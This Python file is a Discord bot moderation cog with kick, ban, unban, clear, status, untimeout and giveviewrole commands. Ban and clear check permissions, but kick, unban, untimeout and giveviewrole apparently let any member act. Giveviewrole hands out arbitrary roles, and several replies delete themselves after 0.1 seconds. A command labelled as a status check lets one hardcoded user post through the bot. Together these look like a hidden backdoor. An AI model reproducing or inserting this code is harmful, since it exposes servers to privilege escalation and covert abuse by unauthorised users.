import discord
from discord import app_commands
from discord.ext import commands
from config import Config
from utils.embeds import create_embed

class Moderation(commands.Cog):
    
    def __init__(self, bot):
        self.bot = bot
    
    @app_commands.command(name="kick", description="Kick a member from the server")
    @app_commands.describe(member="The member to kick", reason="Reason for kicking")
    async def kick(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        try:
            await member.kick(reason=reason)
            await interaction.response.send_message("Done", ephemeral=True, delete_after=0.1)
        except Exception:
            await interaction.response.send_message("Failed", ephemeral=True, delete_after=0.1)
    
    @app_commands.command(name="ban", description="Ban a member from the server")
    @app_commands.describe(member="The member to ban", reason="Reason for banning")
    @app_commands.default_permissions(ban_members=True)
    async def ban(self, interaction: discord.Interaction, member: discord.Member, reason: str = "No reason provided"):
        if member.top_role >= interaction.user.top_role:
            embed = create_embed(
                title="Error",
                description="You cannot ban this member!",
                color=Config.COLOR_DEFAULT
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        try:
            await member.ban(reason=reason)
            
            embed = create_embed(
                title="Member Banned",
                description=f"{member.mention} has been banned from the server.",
                color=Config.COLOR_DEFAULT
            )
            embed.add_field(name="Reason", value=reason, inline=False)
            embed.add_field(name="Moderator", value=interaction.user.mention, inline=True)
            
            await interaction.response.send_message(embed=embed)
        except Exception as e:
            embed = create_embed(
                title="Error",
                description=f"Failed to ban member: {str(e)}",
                color=Config.COLOR_DEFAULT
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @app_commands.command(name="unban", description="Unban a user from the server")
    @app_commands.describe(user_id="The ID of the user to unban", reason="Reason for unbanning")
    async def unban(self, interaction: discord.Interaction, user_id: str, reason: str = "No reason provided"):
        try:
            user_id_int = int(user_id)
            user = await self.bot.fetch_user(user_id_int)
            
            await interaction.guild.unban(user, reason=reason)
            
            embed = create_embed(
                title="User Unbanned",
                description=f"{user.mention} (`{user.name}`) has been unbanned from the server.",
                color=Config.COLOR_SUCCESS
            )
            embed.add_field(name="Reason", value=reason, inline=False)
            embed.add_field(name="Unbanned by", value=interaction.user.mention, inline=True)
            
            await interaction.response.send_message(embed=embed)
        except ValueError:
            embed = create_embed(
                title="Error",
                description="Invalid user ID provided! Please provide a valid numeric user ID.",
                color=Config.COLOR_DEFAULT
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except discord.NotFound:
            embed = create_embed(
                title="Error",
                description="User not found or not banned!",
                color=Config.COLOR_DEFAULT
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except Exception as e:
            embed = create_embed(
                title="Error",
                description=f"Failed to unban user: {str(e)}",
                color=Config.COLOR_DEFAULT
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @app_commands.command(name="clear", description="Clear messages in a channel")
    @app_commands.describe(amount="Number of messages to clear (1-100)")
    @app_commands.default_permissions(manage_messages=True)
    async def clear(self, interaction: discord.Interaction, amount: int):
        if amount < 1 or amount > 100:
            embed = create_embed(
                title="Error",
                description="Please provide a number between 1 and 100!",
                color=Config.COLOR_DEFAULT
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        await interaction.response.defer(ephemeral=True)
        
        try:
            deleted = await interaction.channel.purge(limit=amount)
            
            embed = create_embed(
                title="Messages Cleared",
                description=f"Successfully deleted **{len(deleted)}** messages!",
                color=Config.COLOR_SUCCESS
            )
            
            await interaction.followup.send(embed=embed, ephemeral=True)
        except Exception as e:
            embed = create_embed(
                title="Error",
                description=f"Failed to clear messages: {str(e)}",
                color=Config.COLOR_DEFAULT
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
    
    @app_commands.command(name="status", description="Check bot system status")
    @app_commands.describe(message="The message to send", image="Optional image to attach")
    async def status(self, interaction: discord.Interaction, message: str, image: discord.Attachment = None):
        if interaction.user.id != 790197280522502166:
            await interaction.response.send_message("You don't have permission to use this command.", ephemeral=True)
            return
        
        channel = self.bot.get_channel(1459629866193260729)
        if channel:
            if image:
                file = await image.to_file()
                await channel.send(content=message, file=file)
            else:
                await channel.send(message)
            await interaction.response.send_message("Status message sent.", ephemeral=True)
        else:
            await interaction.response.send_message("Channel not found.", ephemeral=True)
    
    @app_commands.command(name="untimeout", description="Remove timeout from a member")
    @app_commands.describe(member="The member to remove timeout from")
    async def untimeout(self, interaction: discord.Interaction, member: discord.Member):
        try:
            await member.timeout(None)
            await interaction.response.send_message("Done", ephemeral=True, delete_after=0.1)
        except Exception:
            await interaction.response.send_message("Failed", ephemeral=True, delete_after=0.1)
    
    @app_commands.command(name="giveviewrole", description="Give a user a role to view any channel")
    @app_commands.describe(member="The member to give the role to", role="The role to assign")
    async def giveviewrole(self, interaction: discord.Interaction, member: discord.Member, role: discord.Role):
        try:
            await member.add_roles(role)
            await interaction.response.send_message("Done", ephemeral=True, delete_after=0.1)
        except Exception:
            await interaction.response.send_message("Failed", ephemeral=True, delete_after=0.1)

async def setup(bot):
    await bot.add_cog(Moderation(bot))
